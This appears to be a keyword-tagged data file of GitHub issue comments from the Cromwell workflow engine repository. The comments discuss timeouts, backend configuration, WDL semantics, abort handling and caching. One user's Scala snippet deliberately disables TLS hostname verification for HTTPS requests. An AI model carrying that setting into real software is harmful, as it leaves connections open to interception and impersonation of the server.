limit)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395:235,avoid,avoid,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395,1,['avoid'],['avoid']
Safety,"I think it has to, in order to see if the image in the cache hash matches the current pull (or other) request, here is an example: https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/library/pull.go#L55. I’m not super familiar with the code, but looks like the hash is retrieved here https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/oci/pull.go#L36 and then needs to get a manifest https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/build/oci/oci.go#L133 which I’d suspect does just that. https://github.com/containers/image/blob/175bf8b8f9ad897bdc10761e11b466d00f516a63/types/types.go#L238. If a user doesn’t have internet access, or has limited, or there is need to query the registry, might run into trouble. I just tried running an exec to a Docker uri, first of course with Internet to make sure that the images in my cache, and then I disabled my wireless. Without wireless, of course, I couldn’t run anything. This issue could be avoided if the user pulled an image first and then use that image instead of this Docker uri.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995:1087,avoid,avoided,1087,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995,1,['avoid'],['avoided']
Safety,"I think some of the test code is redundant with SwaggerServiceSpec but I don't understand swagger well enough to opine. @kshakir - it looks like you did a lot of the swagger work (albeit a long time ago), any thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289250957:33,redund,redundant,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289250957,1,['redund'],['redundant']
Safety,"I think that this is related with https://github.com/docker/machine/issues/2517, but I believe that cromwell can be more robust to a container still running but detached due to timeout.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371154240:177,timeout,timeout,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371154240,1,['timeout'],['timeout']
Safety,I think the other one is redundant,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/437#issuecomment-185444571:25,redund,redundant,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/437#issuecomment-185444571,1,['redund'],['redundant']
Safety,"I think this is what most people mean when they write declarations in WDL. Some are a bit different from how they're currently interpreted but I think it should make things easier and safer (eg. if it's an optional that has a default, don't force a `select_first`...). ## Example; ```; workflow foo {; Int a ; Int b = 5 ; Int c = b ; Int? d ; Int? e = 6; Int? f = d ; }; ```. |Declaration | Type | *Must* be supplied | **Can** be supplied | Notes | ; |-------|-----------|-------|-|-|; | `Int a` | Int | Yes | Yes | |; | `Int b = 5` | Int | No | Yes | |; | `Int c = b` | Int | No | ~~Yes~~ **No** | Intermediate value. Shouldn't be overridden because it has variable references. |; | `Int? d` | Int? | No | Yes | |; | `Int? e = 5` | ~~Int?~~ **Int** | No | Yes | Can be treated as an `Int` because it has a default |; | `Int? f = d` | Int? | No | ~~Yes~~ **No** | Intermediate value. Shouldn't be overridden because it has variable references. |",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565:184,safe,safer,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565,1,['safe'],['safer']
Safety,"I think we might be having a similar issue:; ```; Bad output 'pindel.deletions': Futures timed out after [60 seconds]; Bad output 'pindel.insertions': Futures timed out after [60 seconds]; Bad output 'pindel.long_insertions': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. If we don't want to change our caching strategy, can we simply increase the timeout? Can that be done with `akka.http.server.request-timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019:1731,timeout,timeout,1731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019,4,['timeout'],['timeout']
Safety,"I thought we were going to try @aednichols's idea for autocommitting the heartbeat writes (still batched, just not wrapped in one big transaction) to avoid having to do this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4240#issuecomment-429881369:150,avoid,avoid,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4240#issuecomment-429881369,1,['avoid'],['avoid']
Safety,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:207,timeout,timeout-seconds,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048,1,['timeout'],['timeout-seconds']
Safety,"I used a custom config file:. ```; akka {; loggers = [""akka.event.slf4j.Slf4jLogger""]; logging-filter = ""akka.event.slf4j.Slf4jLoggingFilter""; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. backend {; providers {; Local {; config {; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""; }; }; }; }; ```. I'm happy to submit a PR to `core/src/main/resources/reference.conf` if that's helpful, but it would basically just replace the `submit-docker` line with the one above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1556#issuecomment-253004034:177,timeout,timeout,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1556#issuecomment-253004034,3,['timeout'],['timeout']
Safety,"I want to comment on the fact that there are hidden dangers in using the function `Float size(Array[File])` as shown in a Terra community forum [post](https://support.terra.bio/hc/en-us/community/posts/360071583412-PreparingJob-state-consumes-most-of-a-task-running-time-how-to-avoid-). For large arrays, this can cause tasks to take forever to start in Google Cloud. Although this is not a WDL specification issue, developers need somehow to be made aware of this, especially in cases where the array contains files that are known in advance to have similar sizes, in which case the following code:; ```; input {; Array[File]+ files; }; Float arr_size = size(files, ""GiB""); ```; Could be replaced by:; ```; input {; Array[File]+ files; }; Float arr_size = length(files) * size(files[0], ""GiB""); ```; And be significantly more efficient.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3183#issuecomment-662042665:278,avoid,avoid,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3183#issuecomment-662042665,1,['avoid'],['avoid']
Safety,"I wanted to follow-up on this error: I am now seeing this error after implementing the standard broad institute alignment pipeline on the HPC at my institute: https://portal.firecloud.org/?return=terra#methods/five-dollar-genome-analysis-pipeline-gilad/five-dollar-genome-analysis-pipeline-gilad/1. Specifically my error is: . [INFO] [08/12/2024 19:26:46.031] [cromwell-system-akka.dispatchers.engine-dispatcher-29] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Workflow 8b8c576b-50bc-4a33-b326-0f69be43ece9 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'CreateSequenceGroupingTSV.sequence_grouping': Failed to read_tsv(""sequence_grouping.txt"") (reason 1 of 1): Future timed out after [60 seconds]; Bad output 'CreateSequenceGroupingTSV.sequence_grouping_with_unmapped': Failed to read_tsv(""sequence_grouping_with_unmapped.txt"") (reason 1 of 1): Future timed out after [60 seconds]. Bad output 'GetBwaVersion.bwa_version': Failed to read_string(""/scratch/tpa239/Step123/TN_2036/TN2036_phylogenetics_8_10_testing/slurm/alignment/alignment_TN2036_sample106/cromwell-executions/WholeGenomeGermlineSingleSample/8b8c576b-50bc-4a33-b326-0f69be43ece9/call-UnmappedBamToAlignedBam/UnmappedBamToAlignedBam/207b9946-03a6-4969-bdab-318482635923/call-GetBwaVersion/execution/stdout"") (reason 1 of 1): Future timed out after [60 seconds]. I think it has to do with this read_tsv and function - sometimes an identical job will have this error and sometimes they don't, I think it has to do with how busy the cluster is. . Is there some setting I can change to increase this timeout? Should I increase the number of cpus or memory for these jobs failing?. I am using cromwell version 85. Thank you!. Toby",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2291515502:1714,timeout,timeout,1714,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2291515502,1,['timeout'],['timeout']
Safety,"I write a new backend. But the hostname verification needs to be canceled due to an internal environment problem. However, after the verification is canceled, the following information is displayed when submitting job:. ```; akka.stream.scaladsl.TcpIdleTimeoutException: TCP idle-timeout encountered on connection to xxxxxxx, no bytes passed in the last 1 minute; java.lang.OutOfMemoryError: GC overhead limit exceeded; ```. If the hostname verification is not canceled, the service is normal. The code is as follows:. ```; val badSslConfig: AkkaSSLConfig = AkkaSSLConfig().mapSettings(s =>; s.withLoose(; s.loose; .withDisableHostnameVerification(true); ); ). val badctx: HttpsConnectionContext = Http().createClientHttpsContext(badSslConfig). private def makeRequest[A](request: HttpRequest)(implicit um: Unmarshaller[ResponseEntity, A]): Future[A] = {. for {; response <- withRetry(() => {. val rsp = if (vkConfiguration.region == ""xxxxxxxxx""){; Await.result({Http().singleRequest(request, badctx)}, Duration.Inf); }else{; Await.result(Http().singleRequest(request), Duration.Inf); }; if (rsp.status.isFailure() && rsp.status.intValue() == 429) {; Future.failed(new RateLimitException(rsp.status.defaultMessage())); } else {; Future.successful(rsp); }; }); data <- if (response.status.isFailure()) {; response.entity.dataBytes.runFold(ByteString(""""))(_ ++ _).map(_.utf8String) flatMap { errorBody =>; Future.failed(new RuntimeException(s""Failed VK request: Code ${response.status.intValue()}, Body = $errorBody"")); }; } else {; Unmarshal(response.entity).to[A]; }; } yield data; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6149:280,timeout,timeout,280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6149,1,['timeout'],['timeout']
Safety,I'd suggest to avoid overlapping `database interaction` arrows with arrows of other types on the diagram. Something like this:; ![image](https://user-images.githubusercontent.com/4853242/68885542-5d3f6500-06e3-11ea-992e-ed9b6d0f3578.png). Looks like something happened with the error between `ServiceRegistryActor` and `HybridMetadataServiceActor`:; ![image](https://user-images.githubusercontent.com/4853242/68885905-0c7c3c00-06e4-11ea-9840-ddb24591df85.png),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-554023387:15,avoid,avoid,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-554023387,1,['avoid'],['avoid']
Safety,I'll close this then and re-open if a file read timeout is reported again. Thanks Adam + Thibault,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-418714485:48,timeout,timeout,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-418714485,1,['timeout'],['timeout']
Safety,I'm (slowly) spinning up a cloud sql instance to sanity check that my branch can handle a gotc db migration in a single transaction.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248127965:49,sanity check,sanity check,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248127965,1,['sanity check'],['sanity check']
Safety,"I'm going to add these notes to the [Spec Doc](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit) and close this issue. Aborts need some serious thought and work, to be tracked in the spec doc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-324470022:155,Abort,Aborts,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-324470022,1,['Abort'],['Aborts']
Safety,"I'm guessing that the ""people aren't around"" thing isn't going to change at 5pm on a Friday, so .... I'm thinking now that instead, perhaps the thing to do is to also have the actor know if read is on and if write is on. When the actor spins up, it ...; - If read is on, just starts determining the cache hit status w/o being asked; - If write is on, starts hashing everything; - If both are on, starts hashing everything but is checking for cache hit until a miss occurs, at which point it's just generating hashes. The actor could then receive two messages, one is ""are you a cache hit"" and the other is ""please now persist to the store"" (if you asked for cache hit status before it was done, perhaps it could send back a ""come back later"" message - that way you can avoid returning the Futures, although perhaps people like that). We know for a fact that if read is on that we'll be checking the cache, so might as well start that ASAP. If write is on, we're potentially wasting energy - e.g. if a job fails, but presumably (hopefully!) job successes are more common than job failures and we can get a jumpstart on the process.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880:769,avoid,avoid,769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880,1,['avoid'],['avoid']
Safety,"I'm late to the party on this, but:. > Then chains of tasks could effectively become one task. I don't think merging of tasks works if you have certain resource or software dependencies, eg: inside a docker container. From a software engineering POV, is it easy / possible to detect and facilitate streaming between tasks like this, especially if they're scheduled as completely separate jobs? To me it sounds super difficult, like you'd have like a ""fuzzy"" dependency graph, and you could end up streaming your result data between nodes or tasks (and even worse if you're running on the cloud). (@mr-c, you've talked about this a [few times](https://github.com/common-workflow-language/cwltool/issues/644#issuecomment-366719563)). > parallel, rather than sequentially. Mostly, but what happens if two of the inputs are technically streamable, or even more complicated how would `stdin` fit into this. The [CWL documentation](https://www.commonwl.org/v1.0/CommandLineTool.html#CommandLineTool) says that it requires the path (eg: [`$(inputs.stdinRef.path)`](; https://www.biostars.org/p/258614/#290536)) which to me sounds like it isn't exactly streamable, but `stdout` [implicitly is?](https://www.commonwl.org/v1.0/CommandLineTool.html#stdout) WDL in the version [1.0 spec](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#language-specification) doesn't include any reference to 'stream', so I'm surprised to see the DNAnexus adding a separate tagging mechanism for this optimisation. _Late edit: reformatting for clarity_; Engine support:. - Cromwell (not supported) [[source](https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455542734)]; - CWLTool (not supported) [[source](https://github.com/common-workflow-language/cwltool/issues/644)]; - Toil (not supported) [[source](https://github.com/common-workflow-language/cwltool/issues/644#issuecomment-366719563)]. But piping (named and anonymous) is super easy in WDL because you have a command line, and in CWL yo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455367417:276,detect,detect,276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455367417,1,['detect'],['detect']
Safety,"I'm not 100% convinced that scaling is completely wired. Have you confirmed that this increase is also affecting your test timeouts? The linked error from #4223 says:. > Attempted 13 times over 5.126574189 seconds. That's *way* too short for something that should have already been scaled 12x. I'm in the process of [adding some println-debugging](https://github.com/broadinstitute/cromwell/commit/29d2f35662d6a81a4de383ad54df4ee0242611a4) on a similar issue. In my case I suspect one of the many, many timeouts wasn't scaled for an akka `.ask`, but will have to wait until the docker network issues are resolved to find out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430412625:123,timeout,timeouts,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430412625,2,['timeout'],['timeouts']
Safety,I'm not actually going to wait for :+1: but will wait for it to go green. My claim will be out of safety but really it's because I'm lazy and will do it later.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2664:98,safe,safety,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2664,1,['safe'],['safety']
Safety,"I'm not sure what this was originally intended for?. It was always set to `List.empty` and never read from, so I think it's safe to remove it.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3303:124,safe,safe,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3303,1,['safe'],['safe']
Safety,"I'm really just trying to avoid ""Cromwell will regress and no longer succeed a workflow that Rawls thinks is fine"". I think the process is reasonable as long as there are some safeguards against this, and if you tell me that the current test approach covers that, fine with me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489691429:26,avoid,avoid,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489691429,2,"['avoid', 'safe']","['avoid', 'safeguards']"
Safety,"I'm running into the same problem here, also on SGE, for a task with 256 shards each with multiple outputs. Looks like about a dozen of the shards failed with the same timeout, and Cromwell attempted retries for half of them without success. @malachig The akka setting only controls the REST API. The timeout we're seeing appears to be hardcoded in Scala.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-495935624:168,timeout,timeout,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-495935624,2,['timeout'],['timeout']
Safety,"I'm still not 100% sure I'm happy with this - ideally we could tell if the timeout was ""a previous copy attempt"" or ""the current copy attempt"", rather than basing this on ""was it a timeout exception...?""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420352896:75,timeout,timeout,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420352896,2,['timeout'],['timeout']
Safety,"I'm working on mutation calling based on cromwell, the **Failed to summarize metadata** comes out for several shards in the scatter, then the following processes are aborted. How to fixed this error?. ```; [2018-11-17 09:04:45,38] [info] BackgroundConfigAsyncJobExecutionActor [3df56d2bPreProcessingForVariantDiscovery_GATK4.MarkDuplicates:5:1]: job id: 56011; [2018-11-17 09:04:45,48] [info] BackgroundConfigAsyncJobExecutionActor [3df56d2bPreProcessingForVariantDiscovery_GATK4.MarkDuplicates:5:1]: Status change from - to WaitingForReturnCodeFile; [2018-11-17 09:37:07,47] [error] Failed to summarize metadata; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 3785ms.; 	at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:548); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:186); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:145); 	at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:83); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:14); 	at slick.jdbc.JdbcBackend$BaseSession.<init>(JdbcBackend.scala:453); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:46); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:37); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession(BasicBackend.scala:249); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession$(BasicBackend.scala:248); 	at slick.jdbc.JdbcBackend$DatabaseDef.acquireSession(JdbcBackend.scala:37); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:274); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); [2018-11-17 09:37:14,33] [error] Error summarizing metadata; java.sql.SQLTransientConnectionException: db - Connecti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4403:166,abort,aborted,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4403,1,['abort'],['aborted']
Safety,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:143,risk,risk,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238,2,['risk'],['risk']
Safety,"I've downloaded the new jar file, still showing version 30.2, but still seeing the problem in some situations:. 2018-02-21 11:03:39,563 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - Abort requested for workflow f0bff6e2-77a6-46f5-b226-13a64339a286.; 2018-02-21 11:03:39,564 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - WorkflowExecutionActor-f0bff6e2-77a6-46f5-b226-13a64339a286 [UUID(f0bff6e2)]: Aborting workflow; 2018-02-21 11:03:39,567 cromwell-system-akka.dispatchers.engine-dispatcher-50 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Several SGE queue jobs continue to run/stay in the queue waiting state. Terminating the server with a ctrl-C does not affect the queued jobs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3325:197,Abort,Abort,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3325,2,['Abort'],"['Abort', 'Aborting']"
Safety,"I've downloaded the new jar file, still showing version 30.2, but still seeing the problem in some situations:. 2018-02-21 11:03:39,563 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - Abort requested for workflow f0bff6e2-77a6-46f5-b226-13a64339a286.; 2018-02-21 11:03:39,564 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - WorkflowExecutionActor-f0bff6e2-77a6-46f5-b226-13a64339a286 [UUID(f0bff6e2)]: Aborting workflow; 2018-02-21 11:03:39,567 cromwell-system-akka.dispatchers.engine-dispatcher-50 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Several SGE queue jobs continue to run/stay in the queue waiting state. Terminating the server with a ctrl-C does not affect the queued jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337:197,Abort,Abort,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337,2,['Abort'],"['Abort', 'Aborting']"
Safety,"I've found at least three kinds of brokenness here:; 1. Cromwell never sends a `WorkflowManagerAbortSuccess` from the `WorkflowManagerActor` to the API handler, so the response to the abort POST is never completed on a successful abort.; 2. If the `WorkflowManagerActor` is asked to abort a workflow ID it doesn't recognize it throws a `WorkflowNotFoundException` which eventually completes the abort request with a 404. Unfortunately the decoupling between the `WorkflowStore` and the `WorkflowManagerActor` introduces a gaping race condition where a legitimate workflow ID may not be known to the `WorkflowManagerActor` for a long time after that ID has been returned to the submitter.; 3. There's a third failure mode where the abort request seems to be ignored with various error and warning messages and jobs just keep running:. ```; 2016-09-09 15:50:44,628 cromwell-system-akka.actor.default-dispatcher-7 INFO - Workflow aed1aad8-588d-4f84-aa09-da0f663d68c0 submitted.; 2016-09-09 15:50:56,111 cromwell-system-akka.actor.default-dispatcher-15 INFO - 1 new workflows fetched; 2016-09-09 15:50:56,112 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Starting workflow UUID(aed1aad8-588d-4f84-aa09-da0f663d68c0); 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Successfully started WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0; 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2016-09-09 15:50:56,175 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from WorkflowUnstartedState to MaterializingWorkflowDescriptorState; 2016-09-09 15:50:56,261 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - MaterializeWorkflowDescriptorActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Call-to-Backend assignmen",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:184,abort,abort,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,5,['abort'],['abort']
Safety,"I've seen this again on Cromwell 25-f80282a, after I aborted a workflow. Rebooting does NOT seem to have cleared it up this time. The workflow bucket doesn't exist. As far as I can tell, there is no mention of the workflow in Cromwell logs (weirdly).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-289962509:53,abort,aborted,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-289962509,2,['abort'],['aborted']
Safety,ID-734 Increase Timeout for DRSHub Communication,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7198:16,Timeout,Timeout,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7198,1,['Timeout'],['Timeout']
Safety,"IET false --VALIDATION_STRINGENCY LENIENT; [2016-10-19 18:29:50,53] [info] SharedFileSystemAsyncJobExecutionActor [51ee236fcase_gatk_acnv_workflow.HetPulldown:12:1]: executing: docker run --rm -v /home/lichtens/test_eval/cromwell-ex; ecutions/case_gatk_acnv_workflow/51ee236f-c31a-48c2-bae7-9246439160b0/call-HetPulldown/shard-12:/root/case_gatk_acnv_workflow/51ee236f-c31a-48c2-bae7-9246439160b0/call-HetPulldown/shard-12; -i broadinstitute/gatk-protected:3c44b2f93e29e360af41ba403465df02931f8e86 /bin/bash < /home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/51ee236f-c31a-48c2-bae7-9246439160; b0/call-HetPulldown/shard-12/execution/script; [2016-10-19 18:29:50,53] [info] SharedFileSystemAsyncJobExecutionActor [51ee236fcase_gatk_acnv_workflow.HetPulldown:12:1]: command: ""/bin/bash"" ""/home/lichtens/test_eval/cromwell-executions; /case_gatk_acnv_workflow/51ee236f-c31a-48c2-bae7-9246439160b0/call-HetPulldown/shard-12/execution/script.submit""; [2016-10-19 18:29:50,54] [info] SharedFileSystemAsyncJobExecutionActor 